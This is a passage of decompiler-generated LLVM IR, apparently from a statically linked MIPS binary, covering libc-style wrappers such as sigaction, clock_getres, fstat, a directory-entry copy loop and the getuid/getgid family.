dec_label_pc_4073e0:
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %sigaction*
  %v7_407400 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp)
  %v3_407404 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_407404, i32* @t9, align 4
  %v1_407408 = icmp eq i32 %arg4, 0
  store i32 %v7_407400, i32* %s0.global-to-local, align 4
  br i1 %v1_407408, label %dec_label_pc_407424, label %dec_label_pc_40740c

dec_label_pc_40740c:                              ; preds = %dec_label_pc_4073e0
  %v1_407410 = call i32 @function_4057a0()
  %v0_40741c = load i32, i32* %s0.global-to-local, align 4
  %v2_40741c = inttoptr i32 %v1_407410 to i32*
  store i32 %v0_40741c, i32* %v2_40741c, align 4
  br label %dec_label_pc_407424

dec_label_pc_407424:                              ; preds = %dec_label_pc_4073e0, %dec_label_pc_40740c
  %v4_40742c = phi i32 [ %v7_407400, %dec_label_pc_4073e0 ], [ -1, %dec_label_pc_40740c ]
  ret i32 %v4_40742c

; uselistorder directives
  uselistorder label %dec_label_pc_407424, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_407440(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_407440:
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_407490(i32 %arg1, %timespec* %arg2) local_unnamed_addr {
dec_label_pc_407490:
  %s0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  store i32 4264, i32* %v0.global-to-local, align 4
  %v4_4074b0 = call i32 @sys_clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_4074b0, i32* %v0.global-to-local, align 4
  %v3_4074b4 = load i32, i32* @global_var_449b6c.83, align 4
  %v0_4074b8 = load i32, i32* @a3, align 4
  %v1_4074b8 = icmp eq i32 %v0_4074b8, 0
  store i32 %v4_4074b0, i32* %s0.global-to-local, align 4
  br i1 %v1_4074b8, label %dec_label_pc_4074d4, label %dec_label_pc_4074bc

dec_label_pc_4074bc:                              ; preds = %dec_label_pc_407490
  call void @__pseudo_call(i32 %v3_4074b4)
  %v0_4074cc = load i32, i32* %s0.global-to-local, align 4
  %v1_4074cc = load i32, i32* %v0.global-to-local, align 4
  %v2_4074cc = inttoptr i32 %v1_4074cc to i32*
  store i32 %v0_4074cc, i32* %v2_4074cc, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4074d4

dec_label_pc_4074d4:                              ; preds = %dec_label_pc_407490, %dec_label_pc_4074bc
  %v4_4074dc = phi i32 [ %v4_4074b0, %dec_label_pc_407490 ], [ -1, %dec_label_pc_4074bc ]
  ret i32 %v4_4074dc

; uselistorder directives
  uselistorder i32* %v0.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_4074d4, { 1, 0 }
}

define i32 @function_4074f0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4074f0:
  %v0.global-to-local = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %v0_407504 = load i32, i32* @s1, align 4
  %v0_407508 = load i32, i32* @s0, align 4
  store i32 %arg2, i32* @s1, align 4
  %tmp10 = bitcast i32* %stack_var_-160 to %stat*
  store i32 4108, i32* %v0.global-to-local, align 4
  %v4_407520 = call i32 @fstat(i32 %arg1, %stat* %tmp10)
  store i32 %v4_407520, i32* %v0.global-to-local, align 4
  %v3_407524 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_407524, i32* @t9, align 4
  %v0_407528 = load i32, i32* @a3, align 4
  %v1_407528 = icmp eq i32 %v0_407528, 0
  store i32 %v4_407520, i32* @s0, align 4
  br i1 %v1_407528, label %dec_label_pc_407548, label %dec_label_pc_40752c

dec_label_pc_40752c:                              ; preds = %dec_label_pc_4074f0
  %v1_407530 = call i32 @function_4057a0()
  store i32 %v1_407530, i32* %v0.global-to-local, align 4
  %v0_40753c = load i32, i32* @s0, align 4
  %v2_40753c = inttoptr i32 %v1_407530 to i32*
  store i32 %v0_40753c, i32* %v2_40753c, align 4
  store i32 -1, i32* @s0, align 4
  %v0_407550.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_407548

dec_label_pc_407548:                              ; preds = %dec_label_pc_4074f0, %dec_label_pc_40752c
  %v0_407550 = phi i32 [ %v4_407520, %dec_label_pc_4074f0 ], [ %v0_407550.pre, %dec_label_pc_40752c ]
  %v0_4075643 = phi i32 [ %v4_407520, %dec_label_pc_4074f0 ], [ -1, %dec_label_pc_40752c ]
  %v3_407548 = load i32, i32* @global_var_449bd0.272, align 4
  store i32 %v3_407548, i32* @t9, align 4
  %v1_407550 = icmp eq i32 %v0_407550, 0
  br i1 %v1_407550, label %dec_label_pc_407554, label %dec_label_pc_407564

dec_label_pc_407554:                              ; preds = %dec_label_pc_407548
  %v2_407550 = load i32, i32* @s1, align 4
  %v4_407558 = call i32 @function_407d80(i32* nonnull %stack_var_-160, i32 %v2_407550)
  store i32 %v4_407558, i32* %v0.global-to-local, align 4
  %v0_407564.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_407564

dec_label_pc_407564:                              ; preds = %dec_label_pc_407548, %dec_label_pc_407554
  %v0_407564 = phi i32 [ %v0_4075643, %dec_label_pc_407548 ], [ %v0_407564.pre, %dec_label_pc_407554 ]
  store i32 %v0_407564, i32* %v0.global-to-local, align 4
  store i32 %v0_407504, i32* @s1, align 4
  store i32 %v0_407508, i32* @s0, align 4
  ret i32 %v0_407564

; uselistorder directives
  uselistorder i32 %v0_407564, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 1, 2, 4, 5, 0, 3 }
  uselistorder i32* @s1, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71 }
  uselistorder label %dec_label_pc_407564, { 1, 0 }
  uselistorder label %dec_label_pc_407548, { 1, 0 }
}

define i32 @function_407580(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407580:
  %a2.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @a1, align 4
  %v0_407590 = load i32, i32* @ra, align 4
  %v3_4075a4 = load i32, i32* @global_var_449b50.273, align 4
  store i32 %v3_4075a4, i32* @t9, align 4
  store i32 %arg1, i32* @s0, align 4
  %v2_4075ac = call i32 @function_407640()
  store i32 %v2_4075ac, i32* %v0.global-to-local, align 4
  %v1_4075b8 = icmp slt i32 %v2_4075ac, 1
  store i32 %v2_4075ac, i32* %s1.global-to-local, align 4
  br i1 %v1_4075b8, label %dec_label_pc_407624, label %dec_label_pc_4075bc

dec_label_pc_4075bc:                              ; preds = %dec_label_pc_407580
  %v0_4075c4 = load i32, i32* @s0, align 4
  %v2_4075c4 = add i32 %v0_4075c4, %v2_4075ac
  store i32 %v2_4075c4, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_4075c8

dec_label_pc_4075c8:                              ; preds = %dec_label_pc_4075c8, %dec_label_pc_4075bc
  %v1_4075d8 = phi i32 [ %v2_40760c, %dec_label_pc_4075c8 ], [ %v0_4075c4, %dec_label_pc_4075bc ]
  %v1_4075c8 = add i32 %v1_4075d8, 16
  %v2_4075c8 = inttoptr i32 %v1_4075c8 to i16*
  %v3_4075c8 = load i16, i16* %v2_4075c8, align 2
  %v4_4075c8 = zext i16 %v3_4075c8 to i32
  store i32 %v4_4075c8, i32* %v0.global-to-local, align 4
  %v1_4075cc = add i32 %v1_4075d8, 8
  %v2_4075cc = inttoptr i32 %v1_4075cc to i32*
  %v3_4075cc = load i32, i32* %v2_4075cc, align 4
  %v1_4075d0 = add i32 %v1_4075d8, 18
  %v2_4075d0 = inttoptr i32 %v1_4075d0 to i8*
  %v3_4075d0 = load i8, i8* %v2_4075d0, align 1
  %v4_4075d0 = zext i8 %v3_4075d0 to i32
  store i32 %v4_4075d0, i32* @a3, align 4
  store i32 %v4_4075c8, i32* %a2.global-to-local, align 4
  %v2_4075d8 = add i32 %v1_4075d8, 4
  %v3_4075d8 = inttoptr i32 %v2_4075d8 to i32*
  store i32 %v3_4075cc, i32* %v3_4075d8, align 4
  %v0_4075dc = load i32, i32* @a3, align 4
  %v1_4075dc = trunc i32 %v0_4075dc to i8
  %v2_4075dc = load i32, i32* @s0, align 4
  %v3_4075dc = add i32 %v2_4075dc, 10
  %v4_4075dc = inttoptr i32 %v3_4075dc to i8*
  store i8 %v1_4075dc, i8* %v4_4075dc, align 1
  %v0_4075e0 = load i32, i32* %v0.global-to-local, align 4
  %v1_4075e0 = trunc i32 %v0_4075e0 to i16
  %v2_4075e0 = load i32, i32* @s0, align 4
  %v3_4075e0 = add i32 %v2_4075e0, 8
  %v4_4075e0 = inttoptr i32 %v3_4075e0 to i16*
  store i16 %v1_4075e0, i16* %v4_4075e0, align 2
  %v0_4075e4 = load i32, i32* @t9, align 4
  %v1_4075e4 = load i32, i32* %a2.global-to-local, align 4
  %v2_4075e4 = add i32 %v1_4075e4, -19
  store i32 %v2_4075e4, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_4075e4)
  %v0_4075f0 = load i32, i32* @s0, align 4
  %v1_4075f0 = add i32 %v0_4075f0, 8
  %v2_4075f0 = inttoptr i32 %v1_4075f0 to i16*
  %v3_4075f0 = load i16, i16* %v2_4075f0, align 2
  %v4_4075f0 = zext i16 %v3_4075f0 to i32
  store i32 %v4_4075f0, i32* %a2.global-to-local, align 4
  %v3_4075f4 = load i32, i32* @global_var_449ab8.274, align 4
  store i32 %v3_4075f4, i32* @t9, align 4
  %v5_4075fc = call i32 @function_4058c0(i32 %v0_4075f0, i32 %v0_4075f0, i32 %v4_4075f0)
  store i32 %v5_4075fc, i32* %v0.global-to-local, align 4
  %v0_407604 = load i32, i32* @s0, align 4
  %v1_407604 = add i32 %v0_407604, 8
  %v2_407604 = inttoptr i32 %v1_407604 to i16*
  %v3_407604 = load i16, i16* %v2_407604, align 2
  %v4_407604 = zext i16 %v3_407604 to i32
  %v2_40760c = add i32 %v4_407604, %v0_407604
  store i32 %v2_40760c, i32* @s0, align 4
  %v1_407610 = load i32, i32* %s2.global-to-local, align 4
  %v2_407610 = icmp ult i32 %v2_40760c, %v1_407610
  %v3_407610 = zext i1 %v2_407610 to i32
  store i32 %v3_407610, i32* %v0.global-to-local, align 4
  %v3_407614 = load i32, i32* @global_var_449ab8.274, align 4
  store i32 %v3_407614, i32* @t9, align 4
  br i1 %v2_407610, label %dec_label_pc_4075c8, label %dec_label_pc_407624.loopexit

dec_label_pc_407624.loopexit:                     ; preds = %dec_label_pc_4075c8
  %v0_407624.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_407624

dec_label_pc_407624:                              ; preds = %dec_label_pc_407624.loopexit, %dec_label_pc_407580
  %v0_407624 = phi i32 [ %v0_407624.pre, %dec_label_pc_407624.loopexit ], [ %v2_4075ac, %dec_label_pc_407580 ]
  store i32 %v0_407624, i32* %v0.global-to-local, align 4
  store i32 %v0_407590, i32* @ra, align 4
  ret i32 %v0_407624

; uselistorder directives
  uselistorder i32 %v0_407624, { 1, 0 }
  uselistorder i32 %v2_40760c, { 1, 2, 0 }
  uselistorder i32 %v0_4075f0, { 1, 0, 2 }
  uselistorder i32 %v1_4075d8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_4075c4, { 1, 0 }
  uselistorder i32 %v2_4075ac, { 1, 0, 2, 3, 4 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 (i32, i32, i32)* @function_4058c0, { 4, 3, 1, 0, 2 }
  uselistorder i32 10, { 14, 15, 0, 16, 6, 17, 18, 1, 19, 8, 4, 20, 7, 21, 22, 23, 2, 24, 25, 26, 9, 10, 11, 5, 12, 27, 28, 29, 3, 30, 31, 13 }
}

define i32 @function_407640() local_unnamed_addr {
dec_label_pc_407640:
  %a2.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %s6.global-to-local = alloca i32, align 4
  %s7.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v1_407648 = load i32, i32* @t9, align 4
  %v2_407648 = add i32 %v1_407648, 304160
  store i32 %v2_407648, i32* %gp.global-to-local, align 4
  %v2_40764c = ptrtoint i32* %stack_var_-72 to i32
  %v0_407680 = load i32, i32* @a2, align 4
  %v1_407680 = add i32 %v0_407680, 14
  %v1_407684 = and i32 %v1_407680, -8
  %v2_40768c = sub i32 %v2_40764c, %v1_407684
  %v1_407690 = add i32 %v2_40768c, 24
  store i32 %v1_407690, i32* %s3.global-to-local, align 4
  %v0_407694 = load i32, i32* @a1, align 4
  store i32 %v0_407694, i32* %s4.global-to-local, align 4
  store i32 %v0_407680, i32* %s5.global-to-local, align 4
  store i32 4219, i32* %v0.global-to-local, align 4
  %v0_4076ac = load i32, i32* @a3, align 4
  %v1_4076ac = icmp eq i32 %v0_4076ac, 0
  store i32 4219, i32* %s2.global-to-local, align 4
  br i1 %v1_4076ac, label %dec_label_pc_4076d0, label %dec_label_pc_4076d8

dec_label_pc_4076d0:                              ; preds = %dec_label_pc_407640
  store i32 -1, i32* %v0.global-to-local, align 4
  store i32 %v0_407694, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_4076e4

dec_label_pc_4076d8:                              ; preds = %dec_label_pc_407640
  %v3_4076b4 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_4076b4, i32* @t9, align 4
  %v1_4076bc = call i32 @function_4057a0()
  store i32 %v2_407648, i32* %gp.global-to-local, align 4
  %v0_4076c8 = load i32, i32* %s2.global-to-local, align 4
  %v2_4076c8 = inttoptr i32 %v1_4076bc to i32*
  store i32 %v0_4076c8, i32* %v2_4076c8, align 4
  store i32 -1, i32* %s2.global-to-local, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v3_4076d42 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v3_4076d42, i32* %s1.global-to-local, align 4
  %v0_4076e4.pre = load i32, i32* %s3.global-to-local, align 4
  %v0_407708.pre.pre = load i32, i32* @a3, align 4
  br label %dec_label_pc_4076e4

dec_label_pc_4076e4:                              ; preds = %dec_label_pc_4076d0, %dec_label_pc_4076d8
  %v0_407708.pre = phi i32 [ 0, %dec_label_pc_4076d0 ], [ %v0_407708.pre.pre, %dec_label_pc_4076d8 ]
  %v0_4077046 = phi i32 [ %v0_407694, %dec_label_pc_4076d0 ], [ %v3_4076d42, %dec_label_pc_4076d8 ]
  %v0_4076e4 = phi i32 [ %v1_407690, %dec_label_pc_4076d0 ], [ %v0_4076e4.pre, %dec_label_pc_4076d8 ]
  store i32 %v0_4076e4, i32* %s0.global-to-local, align 4
  store i32 -1, i32* %s6.global-to-local, align 4
  store i32 -1, i32* %s7.global-to-local, align 4
  br label %dec_label_pc_4076f4

dec_label_pc_4076f4:                              ; preds = %dec_label_pc_40775c, %dec_label_pc_4076e4
  %v0_407708 = phi i32 [ %v4_4077c4, %dec_label_pc_40775c ], [ %v0_407708.pre, %dec_label_pc_4076e4 ]
  %v0_407704 = phi i32 [ %v0_4077bc, %dec_label_pc_40775c ], [ %v0_4077046, %dec_label_pc_4076e4 ]
  %v0_4076f4 = phi i32 [ %v2_4077ac, %dec_label_pc_40775c ], [ %v0_4076e4, %dec_label_pc_4076e4 ]
  %v1_4076f4 = add i32 %v0_4076f4, 16
  %v2_4076f4 = inttoptr i32 %v1_4076f4 to i16*
  %v3_4076f4 = load i16, i16* %v2_4076f4, align 2
  %v4_4076f4 = zext i16 %v3_4076f4 to i32
  store i32 -8, i32* %v1.global-to-local, align 4
  %v1_4076fc = add nuw nsw i32 %v4_4076f4, 7
  %v2_407700 = and i32 %v1_4076fc, 131064
  store i32 %v2_407700, i32* %a2.global-to-local, align 4
  %v2_407704 = add i32 %v2_407700, %v0_407704
  store i32 %v2_407704, i32* %t0.global-to-local, align 4
  %v2_407708 = icmp ult i32 %v0_407708, %v2_407704
  %v3_407708 = zext i1 %v2_407708 to i32
  store i32 %v3_407708, i32* %v0.global-to-local, align 4
  %v1_40770c = icmp eq i1 %v2_407708, false
  br i1 %v1_40770c, label %dec_label_pc_40775c, label %dec_label_pc_407710

dec_label_pc_407710:                              ; preds = %dec_label_pc_4076f4
  %v0_407714 = load i32, i32* %gp.global-to-local, align 4
  %v1_407714 = add i32 %v0_407714, -32132
  %v2_407714 = inttoptr i32 %v1_407714 to i32*
  %v3_407714 = load i32, i32* %v2_407714, align 4
  store i32 %v3_407714, i32* @t9, align 4
  %v0_40771c = load i32, i32* @sp, align 4
  %v1_40771c = add i32 %v0_40771c, 16
  %v2_40771c = inttoptr i32 %v1_40771c to i32*
  store i32 0, i32* %v2_40771c, align 4
  %v0_407720 = load i32, i32* %s6.global-to-local, align 4
  store i32 %v0_407720, i32* %a2.global-to-local, align 4
  %v1_407724 = load i32, i32* %s7.global-to-local, align 4
  store i32 %v1_407724, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_407714)
  store i32 %v2_407648, i32* %gp.global-to-local, align 4
  %v0_407730 = load i32, i32* %s1.global-to-local, align 4
  %v1_407730 = load i32, i32* %s4.global-to-local, align 4
  %v2_407730 = icmp eq i32 %v0_407730, %v1_407730
  br i1 %v2_407730, label %dec_label_pc_407734, label %dec_label_pc_4077cc

dec_label_pc_407734:                              ; preds = %dec_label_pc_407710
  %v3_407738 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_407738, i32* @t9, align 4
  %v1_407740 = call i32 @function_4057a0()
  store i32 %v1_407740, i32* %v0.global-to-local, align 4
  store i32 %v2_407648, i32* %gp.global-to-local, align 4
  store i32 22, i32* %v1.global-to-local, align 4
  %v2_407758 = inttoptr i32 %v1_407740 to i32*
  store i32 22, i32* %v2_407758, align 4
  %v0_40775c.pre = load i32, i32* %s0.global-to-local, align 4
  %v1_40776c.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_40775c

dec_label_pc_40775c:                              ; preds = %dec_label_pc_4076f4, %dec_label_pc_407734
  %v1_40776c = phi i32 [ %v0_407704, %dec_label_pc_4076f4 ], [ %v1_40776c.pre, %dec_label_pc_407734 ]
  %v0_407764 = phi i32 [ %v0_4076f4, %dec_label_pc_4076f4 ], [ %v0_40775c.pre, %dec_label_pc_407734 ]
  %v1_40775c = inttoptr i32 %v0_407764 to i32*
  %v2_40775c = load i32, i32* %v1_40775c, align 4
  store i32 %v2_40775c, i32* %v0.global-to-local, align 4
  %v1_407760 = add i32 %v0_407764, 4
  %v2_407760 = inttoptr i32 %v1_407760 to i32*
  %v3_407760 = load i32, i32* %v2_407760, align 4
  store i32 %v3_407760, i32* %v1.global-to-local, align 4
  %v1_407764 = add i32 %v0_407764, 8
  %v2_407764 = inttoptr i32 %v1_407764 to i32*
  %v3_407764 = load i32, i32* %v2_407764, align 4
  store i32 %v3_407764, i32* %s6.global-to-local, align 4
  %v1_407768 = add i32 %v0_407764, 12
  %v2_407768 = inttoptr i32 %v1_407768 to i32*
  %v3_407768 = load i32, i32* %v2_407768, align 4
  store i32 %v3_407768, i32* %s7.global-to-local, align 4
  %v2_40776c = inttoptr i32 %v1_40776c to i32*
  store i32 %v2_40775c, i32* %v2_40776c, align 4
  %v0_407770 = load i32, i32* %v1.global-to-local, align 4
  %v1_407770 = load i32, i32* %s1.global-to-local, align 4
  %v2_407770 = add i32 %v1_407770, 4
  %v3_407770 = inttoptr i32 %v2_407770 to i32*
  store i32 %v0_407770, i32* %v3_407770, align 4
  %v0_407774 = load i32, i32* %s0.global-to-local, align 4
  %v1_407774 = add i32 %v0_407774, 8
  %v2_407774 = inttoptr i32 %v1_407774 to i32*
  %v3_407774 = load i32, i32* %v2_407774, align 4
  store i32 %v3_407774, i32* %v0.global-to-local, align 4
  %v1_407778 = add i32 %v0_407774, 12
  %v2_407778 = inttoptr i32 %v1_407778 to i32*
  %v3_407778 = load i32, i32* %v2_407778, align 4
  store i32 %v3_407778, i32* %v1.global-to-local, align 4
  %v0_40777c = load i32, i32* %a2.global-to-local, align 4
  %v1_40777c = trunc i32 %v0_40777c to i16
  %v2_40777c = load i32, i32* %s1.global-to-local, align 4
  %v3_40777c = add i32 %v2_40777c, 16
  %v4_40777c = inttoptr i32 %v3_40777c to i16*
  store i16 %v1_40777c, i16* %v4_40777c, align 2
  %v0_407780 = load i32, i32* %v0.global-to-local, align 4
  %v1_407780 = load i32, i32* %s1.global-to-local, align 4
  %v2_407780 = add i32 %v1_407780, 8
  %v3_407780 = inttoptr i32 %v2_407780 to i32*
  store i32 %v0_407780, i32* %v3_407780, align 4
  %v0_407784 = load i32, i32* %v1.global-to-local, align 4
  %v1_407784 = load i32, i32* %s1.global-to-local, align 4
  %v2_407784 = add i32 %v1_407784, 12
  %v3_407784 = inttoptr i32 %v2_407784 to i32*
  store i32 %v0_407784, i32* %v3_407784, align 4
  %v0_407788 = load i32, i32* %s0.global-to-local, align 4
  %v1_407788 = add i32 %v0_407788, 18
  %v2_407788 = inttoptr i32 %v1_407788 to i8*
  %v3_407788 = load i8, i8* %v2_407788, align 1
  %v4_407788 = zext i8 %v3_407788 to i32
  store i32 %v4_407788, i32* %v0.global-to-local, align 4
  %v2_407790 = load i32, i32* %s1.global-to-local, align 4
  %v3_407790 = add i32 %v2_407790, 18
  %v4_407790 = inttoptr i32 %v3_407790 to i8*
  store i8 %v3_407788, i8* %v4_407790, align 1
  %v0_407794 = load i32, i32* %s0.global-to-local, align 4
  %v1_407794 = add i32 %v0_407794, 16
  %v2_407794 = inttoptr i32 %v1_407794 to i16*
  %v3_407794 = load i16, i16* %v2_407794, align 2
  %v4_407794 = zext i16 %v3_407794 to i32
  %v0_407798 = load i32, i32* %t0.global-to-local, align 4
  store i32 %v0_407798, i32* %s1.global-to-local, align 4
  %v0_40779c = load i32, i32* @t9, align 4
  %v2_40779c = add nsw i32 %v4_407794, -19
  store i32 %v2_40779c, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_40779c)
  %v0_4077a4 = load i32, i32* %s0.global-to-local, align 4
  %v1_4077a4 = add i32 %v0_4077a4, 16
  %v2_4077a4 = inttoptr i32 %v1_4077a4 to i16*
  %v3_4077a4 = load i16, i16* %v2_4077a4, align 2
  %v4_4077a4 = zext i16 %v3_4077a4 to i32
  store i32 %v2_407648, i32* %gp.global-to-local, align 4
  %v2_4077ac = add i32 %v4_4077a4, %v0_4077a4
  store i32 %v2_4077ac, i32* %s0.global-to-local, align 4
  %v0_4077b0 = load i32, i32* %s3.global-to-local, align 4
  %v1_4077b0 = load i32, i32* %s2.global-to-local, align 4
  %v2_4077b0 = add i32 %v1_4077b0, %v0_4077b0
  %v2_4077b4 = icmp ult i32 %v2_4077ac, %v2_4077b0
  %v3_4077b4 = zext i1 %v2_4077b4 to i32
  store i32 %v3_4077b4, i32* %v0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_407ea0.211 to i32), i32* @t9, align 4
  %v0_4077bc = load i32, i32* %s1.global-to-local, align 4
  %v1_4077c4 = icmp eq i1 %v2_4077b4, false
  %v2_4077c4 = load i32, i32* %s4.global-to-local, align 4
  %v3_4077c4 = load i32, i32* %s5.global-to-local, align 4
  %v4_4077c4 = add i32 %v3_4077c4, %v2_4077c4
  store i32 %v4_4077c4, i32* @a3, align 4
  br i1 %v1_4077c4, label %dec_label_pc_4077cc, label %dec_label_pc_4076f4

dec_label_pc_4077cc:                              ; preds = %dec_label_pc_40775c, %dec_label_pc_407710
  %v1_4077cc = phi i32 [ %v2_4077c4, %dec_label_pc_40775c ], [ %v1_407730, %dec_label_pc_407710 ]
  %v0_4077cc = phi i32 [ %v0_4077bc, %dec_label_pc_40775c ], [ %v0_407730, %dec_label_pc_407710 ]
  %v2_4077cc = sub i32 %v0_4077cc, %v1_4077cc
  store i32 %v2_4077cc, i32* %v0.global-to-local, align 4
  ret i32 %v2_4077cc

; uselistorder directives
  uselistorder i32 %v2_4077cc, { 1, 0 }
  uselistorder i32 %v4_4077c4, { 1, 0 }
  uselistorder i32 %v2_4077c4, { 1, 0 }
  uselistorder i32 %v2_4077ac, { 1, 2, 0 }
  uselistorder i32 %v0_407764, { 1, 0, 3, 2 }
  uselistorder i32 %v0_407704, { 1, 0 }
  uselistorder i32 %v2_407648, { 0, 2, 1, 3, 4 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 10, 7, 9 }
  uselistorder i32* %s2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %s1.global-to-local, { 0, 1, 3, 4, 5, 6, 7, 9, 8, 10, 2 }
  uselistorder i32* %s0.global-to-local, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %a2.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_407ea0.211 to i32), { 2, 0, 1, 3 }
  uselistorder i32 -19, { 3, 4, 0, 5, 1, 6, 2, 7 }
  uselistorder i32 18, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 1, 0 }
  uselistorder i32 7, { 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_40775c, { 1, 0 }
  uselistorder label %dec_label_pc_4076e4, { 1, 0 }
}

define i32 @function_407810() local_unnamed_addr {
dec_label_pc_407810:
  %s0.global-to-local = alloca i32, align 4
  %v0_407830 = call i32 @getegid()
  %v3_407834 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_407834, i32* @t9, align 4
  %v0_407838 = load i32, i32* @a3, align 4
  %v1_407838 = icmp eq i32 %v0_407838, 0
  store i32 %v0_407830, i32* %s0.global-to-local, align 4
  br i1 %v1_407838, label %dec_label_pc_407854, label %dec_label_pc_40783c

dec_label_pc_40783c:                              ; preds = %dec_label_pc_407810
  %v1_407840 = call i32 @function_4057a0()
  %v0_40784c = load i32, i32* %s0.global-to-local, align 4
  %v2_40784c = inttoptr i32 %v1_407840 to i32*
  store i32 %v0_40784c, i32* %v2_40784c, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_407854

dec_label_pc_407854:                              ; preds = %dec_label_pc_407810, %dec_label_pc_40783c
  %v0_407854 = phi i32 [ %v0_407830, %dec_label_pc_407810 ], [ -1, %dec_label_pc_40783c ]
  ret i32 %v0_407854

; uselistorder directives
  uselistorder label %dec_label_pc_407854, { 1, 0 }
}

define i32 @function_407870() local_unnamed_addr {
dec_label_pc_407870:
  %s0.global-to-local = alloca i32, align 4
  %v0_407890 = call i32 @geteuid()
  %v3_407894 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_407894, i32* @t9, align 4
  %v0_407898 = load i32, i32* @a3, align 4
  %v1_407898 = icmp eq i32 %v0_407898, 0
  store i32 %v0_407890, i32* %s0.global-to-local, align 4
  br i1 %v1_407898, label %dec_label_pc_4078b4, label %dec_label_pc_40789c

dec_label_pc_40789c:                              ; preds = %dec_label_pc_407870
  %v1_4078a0 = call i32 @function_4057a0()
  %v0_4078ac = load i32, i32* %s0.global-to-local, align 4
  %v2_4078ac = inttoptr i32 %v1_4078a0 to i32*
  store i32 %v0_4078ac, i32* %v2_4078ac, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4078b4

dec_label_pc_4078b4:                              ; preds = %dec_label_pc_407870, %dec_label_pc_40789c
  %v0_4078b4 = phi i32 [ %v0_407890, %dec_label_pc_407870 ], [ -1, %dec_label_pc_40789c ]
  ret i32 %v0_4078b4

; uselistorder directives
  uselistorder label %dec_label_pc_4078b4, { 1, 0 }
}

define i32 @function_4078d0() local_unnamed_addr {
dec_label_pc_4078d0:
  %s0.global-to-local = alloca i32, align 4
  %v0_4078f0 = call i32 @getgid()
  %v3_4078f4 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_4078f4, i32* @t9, align 4
  %v0_4078f8 = load i32, i32* @a3, align 4
  %v1_4078f8 = icmp eq i32 %v0_4078f8, 0
  store i32 %v0_4078f0, i32* %s0.global-to-local, align 4
  br i1 %v1_4078f8, label %dec_label_pc_407914, label %dec_label_pc_4078fc

dec_label_pc_4078fc:                              ; preds = %dec_label_pc_4078d0
  %v1_407900 = call i32 @function_4057a0()
  %v0_40790c = load i32, i32* %s0.global-to-local, align 4
  %v2_40790c = inttoptr i32 %v1_407900 to i32*
  store i32 %v0_40790c, i32* %v2_40790c, align 4
  br label %dec_label_pc_407914

dec_label_pc_407914:                              ; preds = %dec_label_pc_4078d0, %dec_label_pc_4078fc
  %v4_40791c = phi i32 [ %v0_4078f0, %dec_label_pc_4078d0 ], [ -1, %dec_label_pc_4078fc ]
  ret i32 %v4_40791c

; uselistorder directives
  uselistorder label %dec_label_pc_407914, { 1, 0 }
}

define i32 @function_407930(i32 %arg1) local_unnamed_addr {
dec_label_pc_407930:
